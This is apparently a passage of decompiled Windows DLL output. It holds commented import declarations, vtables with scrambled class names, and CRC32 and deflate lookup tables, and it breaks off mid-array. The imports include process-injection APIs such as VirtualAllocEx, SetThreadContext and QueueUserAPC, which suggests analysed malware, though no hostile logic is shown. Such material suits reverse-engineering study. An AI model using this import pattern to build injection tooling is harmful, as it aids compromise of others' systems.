// extern LONG (__stdcall *InterlockedIncrement)(volatile LONG *lpAddend);
// extern DWORD (__stdcall *GetCurrentThreadId)();
// extern UINT (__stdcall *SetErrorMode)(UINT uMode);
// extern DWORD (__stdcall *SetFilePointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
// extern BOOL (__stdcall *FindClose)(HANDLE hFindFile);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern BOOL (__stdcall *SetEndOfFile)(HANDLE hFile);
// extern BOOL (__stdcall *FileTimeToLocalFileTime)(const FILETIME *lpFileTime, LPFILETIME lpLocalFileTime);
// extern BOOL (__stdcall *GetFileInformationByHandle)(HANDLE hFile, LPBY_HANDLE_FILE_INFORMATION lpFileInformation);
// extern BOOL (__stdcall *SetFileAttributesW)(LPCWSTR lpFileName, DWORD dwFileAttributes);
// extern BOOL (__stdcall *GetFileTime)(HANDLE hFile, LPFILETIME lpCreationTime, LPFILETIME lpLastAccessTime, LPFILETIME lpLastWriteTime);
// extern BOOL (__stdcall *LocalFileTimeToFileTime)(const FILETIME *lpLocalFileTime, LPFILETIME lpFileTime);
// extern BOOL (__stdcall *SetFileTime)(HANDLE hFile, const FILETIME *lpCreationTime, const FILETIME *lpLastAccessTime, const FILETIME *lpLastWriteTime);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern DWORD (__stdcall *GetFullPathNameW)(LPCWSTR lpFileName, DWORD nBufferLength, LPWSTR lpBuffer, LPWSTR *lpFilePart);
// extern HANDLE (__stdcall *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern BOOL (__stdcall *FlushFileBuffers)(HANDLE hFile);
// extern DWORD (__stdcall *GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
// extern DWORD (__stdcall *GetLastError)();
// extern HANDLE (__stdcall *FindFirstFileW)(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
// extern BOOL (__stdcall *SetEnvironmentVariableW)(LPCWSTR lpName, LPCWSTR lpValue);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern void (__stdcall *GetSystemTimeAsFileTime)(LPFILETIME lpSystemTimeAsFileTime);
// extern DWORD (__stdcall *GetCurrentProcessId)();
// extern BOOL (__stdcall *SetEvent)(HANDLE hEvent);
// extern BOOL (__stdcall *ResetEvent)(HANDLE hEvent);
// extern HANDLE (__stdcall *CreateEventW)(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCWSTR lpName);
// extern HANDLE (__stdcall *OpenEventW)(DWORD dwDesiredAccess, BOOL bInheritHandle, LPCWSTR lpName);
// extern HLOCAL (__stdcall *LocalFree)(HLOCAL hMem);
// extern HANDLE (__stdcall *GetCurrentProcess)();
// extern HMODULE (__stdcall *GetModuleHandleW)(LPCWSTR lpModuleName);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern BOOL (__stdcall *GetVersionExA)(LPOSVERSIONINFOA lpVersionInformation);
// extern void (__stdcall *SetLastError)(DWORD dwErrCode);
// extern HANDLE (__stdcall *OpenMutexW)(DWORD dwDesiredAccess, BOOL bInheritHandle, LPCWSTR lpName);
// extern HANDLE (__stdcall *CreateMutexA)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);
// extern HANDLE (__stdcall *CreateMutexW)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCWSTR lpName);
// extern BOOL (__stdcall *ReleaseMutex)(HANDLE hMutex);
// extern void (__stdcall __noreturn *ExitThread)(DWORD dwExitCode);
// extern DWORD (__stdcall *GetVersion)();
// extern BOOL (__stdcall *ProcessIdToSessionId)(DWORD dwProcessId, DWORD *pSessionId);
// extern HANDLE (__stdcall *CreateFileMappingW)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCWSTR lpName);
// extern LPWSTR (__stdcall *lstrcatW)(LPWSTR lpString1, LPCWSTR lpString2);
// extern LPSTR (__stdcall *lstrcpynA)(LPSTR lpString1, LPCSTR lpString2, int iMaxLength);
// extern BOOL (__stdcall *HeapFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// extern HANDLE (__stdcall *GetProcessHeap)();
// extern BOOL (__stdcall *IsBadReadPtr)(const void *lp, UINT_PTR ucb);
// extern UINT (__stdcall *GetSystemDirectoryW)(LPWSTR lpBuffer, UINT uSize);
// extern LPWSTR (__stdcall *lstrcpynW)(LPWSTR lpString1, LPCWSTR lpString2, int iMaxLength);
// extern DWORD (__stdcall *GetModuleFileNameW)(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
// extern BOOL (__stdcall *SystemTimeToFileTime)(const SYSTEMTIME *lpSystemTime, LPFILETIME lpFileTime);
// extern void (__stdcall *GetSystemTime)(LPSYSTEMTIME lpSystemTime);
// extern BOOL (__stdcall *SetThreadContext)(HANDLE hThread, const CONTEXT *lpContext);
// extern DWORD (__stdcall *QueueUserAPC)(PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData);
// extern BOOL (__stdcall *GetThreadContext)(HANDLE hThread, LPCONTEXT lpContext);
// extern BOOL (__stdcall *RemoveDirectoryW)(LPCWSTR lpPathName);
// extern BOOL (__stdcall *GetExitCodeProcess)(HANDLE hProcess, LPDWORD lpExitCode);
// extern DWORD (__stdcall *GetShortPathNameW)(LPCWSTR lpszLongPath, LPWSTR lpszShortPath, DWORD cchBuffer);
// extern DWORD (__stdcall *GetFileAttributesW)(LPCWSTR lpFileName);
// extern BOOL (__stdcall *GetVolumeInformationW)(LPCWSTR lpRootPathName, LPWSTR lpVolumeNameBuffer, DWORD nVolumeNameSize, LPDWORD lpVolumeSerialNumber, LPDWORD lpMaximumComponentLength, LPDWORD lpFileSystemFlags, LPWSTR lpFileSystemNameBuffer, DWORD nFileSystemNameSize);
// extern BOOL (__stdcall *TerminateProcess)(HANDLE hProcess, UINT uExitCode);
// extern BOOL (__stdcall *DeleteFileW)(LPCWSTR lpFileName);
// extern BOOL (__stdcall *CreateProcessW)(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// extern DWORD (__stdcall *GetLongPathNameW)(LPCWSTR lpszShortPath, LPWSTR lpszLongPath, DWORD cchBuffer);
// extern HANDLE (__stdcall *OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// extern LPVOID (__stdcall *VirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// extern DWORD (__stdcall *SearchPathW)(LPCWSTR lpPath, LPCWSTR lpFileName, LPCWSTR lpExtension, DWORD nBufferLength, LPWSTR lpBuffer, LPWSTR *lpFilePart);
// extern int (__stdcall *lstrlenA)(LPCSTR lpString);
// extern BOOL (__stdcall *IsBadStringPtrA)(LPCSTR lpsz, UINT_PTR ucchMax);
// extern int (__stdcall *lstrcmpiA)(LPCSTR lpString1, LPCSTR lpString2);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern UINT (__stdcall *GetWindowsDirectoryW)(LPWSTR lpBuffer, UINT uSize);
// extern UINT (__stdcall *GetTempFileNameW)(LPCWSTR lpPathName, LPCWSTR lpPrefixString, UINT uUnique, LPWSTR lpTempFileName);
// extern DWORD (__stdcall *GetTempPathW)(DWORD nBufferLength, LPWSTR lpBuffer);
// extern DWORD (__stdcall *GetCurrentDirectoryW)(DWORD nBufferLength, LPWSTR lpBuffer);
// extern BOOL (__stdcall *VirtualFreeEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
// extern BOOL (__stdcall *ReadProcessMemory)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
// extern BOOL (__stdcall *VirtualProtectEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// extern SIZE_T (__stdcall *VirtualQueryEx)(HANDLE hProcess, LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
// extern BOOL (__stdcall *UnmapViewOfFile)(LPCVOID lpBaseAddress);
// extern BOOL (__stdcall *FreeLibrary)(HMODULE hLibModule);
// extern DWORD (__stdcall *WaitForMultipleObjectsEx)(DWORD nCount, const HANDLE *lpHandles, BOOL bWaitAll, DWORD dwMilliseconds, BOOL bAlertable);
// extern LPVOID (__stdcall *TlsGetValue)(DWORD dwTlsIndex);
// extern BOOL (__stdcall *TlsSetValue)(DWORD dwTlsIndex, LPVOID lpTlsValue);
// extern DWORD (__stdcall *TlsAlloc)();
// extern BOOL (__stdcall *TlsFree)(DWORD dwTlsIndex);
// extern LPVOID (__stdcall *MapViewOfFile)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
// extern HANDLE (__stdcall *OpenFileMappingW)(DWORD dwDesiredAccess, BOOL bInheritHandle, LPCWSTR lpName);
// extern BOOL (__stdcall *FindNextFileW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
// extern HANDLE (__stdcall *CreateEventA)(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName);
// extern DWORD (__stdcall *WaitForMultipleObjects)(DWORD nCount, const HANDLE *lpHandles, BOOL bWaitAll, DWORD dwMilliseconds);
// extern int (__stdcall *lstrlenW)(LPCWSTR lpString);
// extern HLOCAL (__stdcall *LocalAlloc)(UINT uFlags, SIZE_T uBytes);
// extern LONG (__stdcall *InterlockedExchange)(volatile LONG *Target, LONG Value);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern void (__stdcall *RaiseException)(DWORD dwExceptionCode, DWORD dwExceptionFlags, DWORD nNumberOfArguments, const ULONG_PTR *lpArguments);
_UNKNOWN unk_1008B24C; // weak
void *_xho_fdflj::`vftable' = &sub_1004B430; // weak
_UNKNOWN unk_1008B264; // weak
_UNKNOWN unk_1008B274; // weak
_UNKNOWN unk_1008B284; // weak
const IID riid = { 136441u, 0u, 0u, { 192u, 0u, 0u, 0u, 0u, 0u, 0u, 70u } }; // idb
_UNKNOWN unk_1008C770; // weak
const IID rclsid = { 136193u, 0u, 0u, { 192u, 0u, 0u, 0u, 0u, 0u, 0u, 70u } }; // idb
_UNKNOWN unk_1008D9C0; // weak
_UNKNOWN unk_1008DA30; // weak
void *ikc::izq_ezibc::`vftable' = &sub_1004CB8E; // weak
void *nxys_uwip::`vftable' = &sub_1004CCB4; // weak
void *ikc::qlurhxmnb::`vftable' = &sub_1005372E; // weak
void *ikc::sjn_wxme::`vftable' = &sub_1005374A; // weak
void *ikc::zji_ljuxnx::`vftable' = &sub_1005376C; // weak
void *ikc::rnp_nhgjjqmxr::`vftable' = &sub_1005A8FF; // weak
char byte_10090264[20] =
{
  '\x10',
  '\x11',
  '\x12',
  '\0',
  '\b',
  '\a',
  '\t',
  '\x06',
  '\n',
  '\x05',
  '\v',
  '\x04',
  '\f',
  '\x03',
  '\r',
  '\x02',
  '\x0E',
  '\x01',
  '\x0F',
  '\0'
}; // weak
int dword_10090278[256] =
{
  0,
  1996959894,
  -301047508,
  -1727442502,
  124634137,
  1886057615,
  -379345611,
  -1637575261,
  249268274,
  2044508324,
  -522852066,
  -1747789432,
  162941995,
  2125561021,
  -407360249,
  -1866523247,
  498536548,
  1789927666,
  -205950648,
  -2067906082,
  450548861,
  1843258603,
  -187386543,
  -2083289657,
  325883990,
  1684777152,
  -43845254,
  -1973040660,
  335633487,
  1661365465,
  -99664541,
  -1928851979,
  997073096,
  1281953886,
  -715111964,
  -1570279054,
  1006888145,
  1258607687,
  -770865667,
  -1526024853,
  901097722,
  1119000684,
  -608450090,
  -1396901568,
  853044451,
  1172266101,
  -589951537,
  -1412350631,
  651767980,
  1373503546,
  -925412992,
  -1076862698,
  565507253,
  1454621731,
  -809855591,
  -1195530993,
  671266974,
  1594198024,
  -972236366,
  -1324619484,
  795835527,
  1483230225,
  -1050600021,
  -1234817731,
  1994146192,
  31158534,
  -1731059524,
  -271249366,
  1907459465,
  112637215,
  -1614814043,
  -390540237,
  2013776290,
  251722036,
  -1777751922,
  -519137256,
  2137656763,
  141376813,
  -1855689577,
  -429695999,
  1802195444,
  476864866,
  -2056965928,
  -228458418,
  1812370925,
  453092731,
  -2113342271,
  -183516073,
  1706088902,
  314042704,
  -1950435094,
  -54949764,
  1658658271,
  366619977,
  -1932296973,
  -69972891,
  1303535960,
  984961486,
  -1547960204,
  -725929758,
  1256170817,
  1037604311,
  -1529756563,
  -740887301,
  1131014506,
  879679996,
  -1385723834,
  -631195440,
  1141124467,
  855842277,
  -1442165665,
  -586318647,
  1342533948,
  654459306,
  -1106571248,
  -921952122,
  1466479909,
  544179635,
  -1184443383,
  -832445281,
  1591671054,
  702138776,
  -1328506846,
  -942167884,
  1504918807,
  783551873,
  -1212326853,
  -1061524307,
  -306674912,
  -1698712650,
  62317068,
  1957810842,
  -355121351,
  -1647151185,
  81470997,
  1943803523,
  -480048366,
  -1805370492,
  225274430,
  2053790376,
  -468791541,
  -1828061283,
  167816743,
  2097651377,
  -267414716,
  -2029476910,
  503444072,
  1762050814,
  -144550051,
  -2140837941,
  426522225,
  1852507879,
  -19653770,
  -1982649376,
  282753626,
  1742555852,
  -105259153,
  -1900089351,
  397917763,
  1622183637,
  -690576408,
  -1580100738,
  953729732,
  1340076626,
  -776247311,
  -1497606297,
  1068828381,
  1219638859,
  -670225446,
  -1358292148,
  906185462,
  1090812512,
  -547295293,
  -1469587627,
  829329135,
  1181335161,
  -882789492,
  -1134132454,
  628085408,
  1382605366,
  -871598187,
  -1156888829,
  570562233,
  1426400815,
  -977650754,
  -1296233688,
  733239954,
  1555261956,
  -1026031705,
  -1244606671,
  752459403,
  1541320221,
  -1687895376,
  -328994266,
  1969922972,
  40735498,
  -1677130071,
  -351390145,
  1913087877,
  83908371,
  -1782625662,
  -491226604,
  2075208622,
  213261112,
  -1831694693,
  -438977011,
  2094854071,
  198958881,
  -2032938284,
  -237706686,
  1759359992,
  534414190,
  -2118248755,
  -155638181,
  1873836001,
  414664567,
  -2012718362,
  -15766928,
  1711684554,
  285281116,
  -1889165569,
  -127750551,
  1634467795,
  376229701,
  -1609899400,
  -686959890,
  1308918612,
  956543938,
  -1486412191,
  -799009033,
  1231636301,
  1047427035,
  -1362007478,
  -640263460,
  1088359270,
  936918000,
  -1447252397,
  -558129467,
  1202900863,
  817233897,
  -1111625188,
  -893730166,
  1404277552,
  615818150,
  -1160759803,
  -841546093,
  1423857449,
  601450431,
  -1285129682,
  -1000256840,
  1567103746,
  711928724,
  -1274298825,
  -1022587231,
  1510334235,
  755167117
}; // weak
int dword_10090678[256] =
{
  0,
  421212481,
  842424962,
  724390851,
  1684849924,
  2105013317,
  1448781702,
  1329698503,
  -925267448,
  -775767223,
  -84940662,
  -470492725,
  -1397403892,
  -1246855603,
  -1635570290,
  -2020074289,
  1254232657,
  1406739216,
  2029285587,
  1643069842,
  783210325,
  934667796,
  479770071,
  92505238,
  -2112120743,
  -1694455528,
  -1339163941,
  -1456026726,
  -428384931,
  -9671652,
  -733921313,
  -849736034,
  -1786501982,
  -1935731229,
  -1481488864,
  -1096190111,
  -236396122,
  -386674457,
  -1008827612,
  -624577947,
  1566420650,
  1145479147,
  1869335592,
  1987116393,
  959540142,
  539646703,
  185010476,
  303839341,
  -549046541,
  -966981710,
  -311405455,
  -194288336,
  -1154812937,
  -1573797194,
  -1994616459,
  -1878548428,
  396344571,
  243568058,
  631889529,
  1018359608,
  1945336319,
  1793607870,
  1103436669,
  1490954812,
  -260485371,
  -379421116,
  -1034998393,
  -615244602,
  -1810527743,
  -1928414400,
  -1507596157,
  -1086793278,
  950060301,
  565965900,
  177645455,
  328046286,
  1556873225,
  1171730760,
  1861902987,
  2011255754,
  -1162125996,
  -1549767659,
  -2004009002,
  -1852436841,
  -556296112,
  -942888687,
  -320734510,
  -168113261,
  1919080284,
  1803150877,
  1079293406,
  1498383519,
  370020952,
  253043481,
  607678682,
  1025720731,
  1711106983,
  2095471334,
  1472923941,
  1322268772,
  26324643,
  411738082,
  866634785,
  717028704,
  -1390091857,
  -1270886162,
  -1626176723,
  -2046184852,
  -918018901,
  -799861270,
  -75610583,
  -496666776,
  792689142,
  908347575,
  487136116,
  68299317,
  1263779058,
  1380486579,
  2036719216,
  1618931505,
  -404294658,
  -16923969,
  -707751556,
  -859070403,
  -2088093958,
  -1701771333,
  -1313057672,
  -1465424583,
  998479947,
  580430090,
  162921161,
  279890824,
  1609522511,
  1190423566,
  1842954189,
  1958874764,
  -212200893,
  -364829950,
  -1049857855,
  -663273088,
  -1758013625,
  -1909594618,
  -1526680123,
  -1139047292,
  1900120602,
  1750776667,
  1131931800,
  1517083097,
  355290910,
  204897887,
  656092572,
  1040194781,
  -1181220846,
  -1602014893,
  -1951505776,
  -1833610287,
  -571161322,
  -990907305,
  -272455788,
  -153512235,
  -1375224599,
  -1222865496,
  -1674453397,
  -2060783830,
  -898926099,
  -747616084,
  -128115857,
  -515495378,
  1725839073,
  2143618976,
  1424512099,
  1307796770,
  45282277,
  464110244,
  813994343,
  698327078,
  -456806728,
  -35741703,
  -688665542,
  -806814341,
  -2136380484,
  -1716364547,
  -1298200258,
  -1417398145,
  740041904,
  889656817,
  506086962,
  120682355,
  1215357364,
  1366020341,
  2051441462,
  1667084919,
  -872753330,
  -756947441,
  -104024628,
  -522746739,
  -1349119414,
  -1232264437,
  -1650429752,
  -2068102775,
  52649286,
  439905287,
  823476164,
  672009861,
  1733269570,
  2119477507,
  1434057408,
  1281543041,
  -2126985953,
  -1742474146,
  -1290885219,
  -1441425700,
  -447479781,
  -61918886,
  -681418087,
  -830909480,
  1239502615,
  1358593622,
  2077699477,
  1657543892,
  764250643,
  882293586,
  532408465,
  111204816,
  1585378284,
  1197851309,
  1816695150,
  1968414767,
  974272232,
  587794345,
  136598634,
  289367339,
  -1767409180,
  -1883486043,
  -1533994138,
  -1115018713,
  -221528864,
  -338653791,
  -1057104286,
  -639176925,
  347922877,
  229101820,
  646611775,
  1066513022,
  1892689081,
  1774917112,
  1122387515,
  1543337850,
  -597333067,
  -981574924,
  -296548041,
  -146261898,
  -1207325007,
  -1592614928,
  -1975530445,
  -1826292366
}; // weak
int dword_10090A78[256] =
{
  0,
  29518391,
  59036782,
  38190681,
  118073564,
  114017003,
  76381362,
  89069189,
  236147128,
  265370511,
  228034006,
  206958561,
  152762724,
  148411219,
  178138378,
  190596925,
  472294256,
  501532999,
  530741022,
  509615401,
  456068012,
  451764635,
  413917122,
  426358261,
  305525448,
  334993663,
  296822438,
  275991697,
  356276756,
  352202787,
  381193850,
  393929805,
  944588512,
  965684439,
  1003065998,
  973863097,
  1061482044,
  1049003019,
  1019230802,
  1023561829,
  912136024,
  933002607,
  903529270,
  874031361,
  827834244,
  815125939,
  852716522,
  856752605,
  611050896,
  631869351,
  669987326,
  640506825,
  593644876,
  580921211,
  551983394,
  556069653,
  712553512,
  733666847,
  704405574,
  675154545,
  762387700,
  749958851,
  787859610,
  792175277,
  1889177024,
  1901651959,
  1931368878,
  1927033753,
  2006131996,
  1985040171,
  1947726194,
  1976933189,
  2122964088,
  2135668303,
  2098006038,
  2093965857,
  2038461604,
  2017599123,
  2047123658,
  2076625661,
  1824272048,
  1836991623,
  1866005214,
  1861914857,
  1807058540,
  1786244187,
  1748062722,
  1777547317,
  1655668488,
  1668093247,
  1630251878,
  1625932113,
  1705433044,
  1684323811,
  1713505210,
  1742760333,
  1222101792,
  1226154263,
  1263738702,
  1251046777,
  1339974652,
  1310460363,
  1281013650,
  1301863845,
  1187289752,
  1191637167,
  1161842422,
  1149379777,
  1103966788,
  1074747507,
  1112139306,
  1133218845,
  1425107024,
  1429406311,
  1467333694,
  1454888457,
  1408811148,
  1379576507,
  1350309090,
  1371438805,
  1524775400,
  1528845279,
  1499917702,
  1487177649,
  1575719220,
  1546255107,
  1584350554,
  1605185389,
  -516613248,
  -520654409,
  -491663378,
  -478960167,
  -432229540,
  -402728597,
  -440899790,
  -461763323,
  -282703304,
  -287039473,
  -324886954,
  -312413087,
  -399514908,
  -370308909,
  -341100918,
  -362193731,
  -49039120,
  -53357881,
  -23630690,
  -11204951,
  -98955220,
  -69699045,
  -107035582,
  -128143755,
  -218044088,
  -222133377,
  -259769050,
  -247048431,
  -200719980,
  -171234397,
  -141715974,
  -162529331,
  -646423200,
  -658884777,
  -620984050,
  -616635591,
  -562956868,
  -541876341,
  -571137582,
  -600355867,
  -680850216,
  -693541137,
  -722478922,
  -718425471,
  -798841852,
  -777990605,
  -739872662,
  -769385891,
  -983630320,
  -996371417,
  -958780802,
  -954711991,
  -1034463540,
  -1013629701,
  -1043103070,
  -1072568171,
  -884101208,
  -896547425,
  -926319674,
  -922021391,
  -867956876,
  -846828221,
  -809446630,
  -838682323,
  -1850763712,
  -1871840137,
  -1842658770,
  -1813436391,
  -1767489892,
  -1755032405,
  -1792873742,
  -1797226299,
  -1615017992,
  -1635865137,
  -1674046570,
  -1644529247,
  -1732939996,
  -1720253165,
  -1691239606,
  -1695297155,
  -1920387792,
  -1941217529,
  -1911692962,
  -1882223767,
  -1971282452,
  -1958545445,
  -1996207742,
  -2000280651,
  -2087033720,
  -2108158273,
  -2145472282,
  -2116232495,
  -2070688684,
  -2058246557,
  -2028529606,
  -2032831987,
  -1444753248,
  -1474250089,
  -1436154674,
  -1415287047,
  -1360299908,
  -1356262837,
  -1385190382,
  -1397897691,
  -1477345000,
  -1506546897,
  -1535814282,
  -1514717375,
  -1594349116,
  -1590017037,
  -1552089686,
  -1564567651,
  -1245416496,
  -1274668569,
  -1237276738,
  -1216164471,
  -1295131892,
  -1290817221,
  -1320611998,
  -1333041835,
  -1143528856,
  -1173010337,
  -1202457082,
  -1181639631,
  -1126266188,
  -1122180989,
  -1084596518,
  -1097321235
}; // weak
int dword_10090E78[256] =
{
  0,
  -1195612315,
  -1442199413,
  313896942,
  -1889364137,
  937357362,
  627793884,
  -1646839623,
  -978048785,
  2097696650,
  1874714724,
  -687765759,
  1255587768,
  -227878691,
  -522225869,
  1482887254,
  1343838111,
  -391827206,
  -99573996,
  1118632049,
  -545537848,
  1741137837,
  1970407491,
  -842109146,
  -1783791760,
  756094997,
  1067759611,
  -2028416866,
  449832999,
  -1569484990,
  -1329192788,
  142231497,
  -1607291074,
  412010587,
  171665333,
  -1299775280,
  793786473,
  -1746116852,
  -2057703198,
  1038456711,
  1703315409,
  -583343948,
  -812691622,
  1999841343,
  -354152314,
  1381529571,
  1089329165,
  -128860312,
  -265553759,
  1217896388,
  1512189994,
  -492939441,
  2135519222,
  -940242797,
  -717183107,
  1845280792,
  899665998,
  -1927039189,
  -1617553211,
  657096608,
  -1157806311,
  37822588,
  284462994,
  -1471616777,
  -1693165507,
  598228824,
  824021174,
  -1985873965,
  343330666,
  -1396004849,
  -1098971167,
  113467524,
  1587572946,
  -434366537,
  -190203815,
  1276501820,
  -775755899,
  1769898208,
  2076913422,
  -1015592853,
  -888336478,
  1941006535,
  1627703081,
  -642211764,
  1148164341,
  -53215344,
  -295284610,
  1457141531,
  247015245,
  -1241169880,
  -1531908154,
  470583459,
  -2116308966,
  963106687,
  735213713,
  -1821499404,
  992409347,
  -2087022490,
  -1859174520,
  697522413,
  -1270587308,
  217581361,
  508405983,
  -1494102086,
  -23928852,
  1177467017,
  1419450215,
  -332959742,
  1911572667,
  -917753890,
  -604405712,
  1665525589,
  1799331996,
  -746338311,
  -1053399017,
  2039091058,
  -463652917,
  1558270126,
  1314193216,
  -152528859,
  -1366587277,
  372764438,
  75645176,
  -1136777315,
  568925988,
  -1722451903,
  -1948198993,
  861712586,
  -312887749,
  1441124702,
  1196457648,
  -1304107,
  1648042348,
  -628668919,
  -936187417,
  1888390786,
  686661332,
  -1873675855,
  -2098964897,
  978858298,
  -1483798141,
  523464422,
  226935048,
  -1254447507,
  -1119821404,
  100435649,
  390670639,
  -1342878134,
  841119475,
  -1969352298,
  -1741963656,
  546822429,
  2029308235,
  -1068978642,
  -755170880,
  1782671013,
  -141140452,
  1328167289,
  1570739863,
  -450629134,
  1298864389,
  -170426784,
  -412954226,
  1608431339,
  -1039561134,
  2058742071,
  1744848601,
  -792976964,
  -1998638614,
  811816591,
  584513889,
  -1704288764,
  129869501,
  -1090403880,
  -1380684234,
  352848211,
  494030490,
  -1513215489,
  -1216641519,
  264757620,
  -1844389427,
  715964072,
  941166918,
  -2136639965,
  -658086283,
  1618608400,
  1926213374,
  -898381413,
  1470427426,
  -283601337,
  -38979159,
  1158766284,
  1984818694,
  -823031453,
  -599513459,
  1693991400,
  -114329263,
  1100160564,
  1395044826,
  -342174017,
  -1275476247,
  189112716,
  435162722,
  -1588827897,
  1016811966,
  -2077804837,
  -1768777419,
  774831696,
  643086745,
  -1628905732,
  -1940033262,
  887166583,
  -1456066866,
  294275499,
  54519365,
  -1149009632,
  -471821962,
  1532818963,
  1240029693,
  -246071656,
  1820460577,
  -734109372,
  -963916118,
  2117577167,
  -696303304,
  1858283101,
  2088143283,
  -993333546,
  1495127663,
  -509497078,
  -216785180,
  1269332353,
  332098007,
  -1418260814,
  -1178427044,
  25085497,
  -1666580864,
  605395429,
  916469259,
  -1910746770,
  -2040129881,
  1054503362,
  745528876,
  -1798063799,
  151290352,
  -1313282411,
  -1559410309,
  464596510,
  1137851976,
  -76654291,
  -371460413,
  1365741990,
  -860837601,
  1946996346,
  1723425172,
  -570095887
}; // weak
int dword_10092278[] = { 0 }; // weak
int dword_100922F0 = 0; // weak
_UNKNOWN unk_100923B8; // weak
_UNKNOWN unk_10092838; // weak
char byte_100928B0[256] =
{
  '\0',
  '\x01',
  '\x02',
  '\x03',
  '\x04',
  '\x04',
  '\x05',
  '\x05',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\a',
  '\a',
  '\a',
  '\a',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\t',
  '\t',
  '\t',
  '\t',
  '\t',
  '\t',
  '\t',
  '\t',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
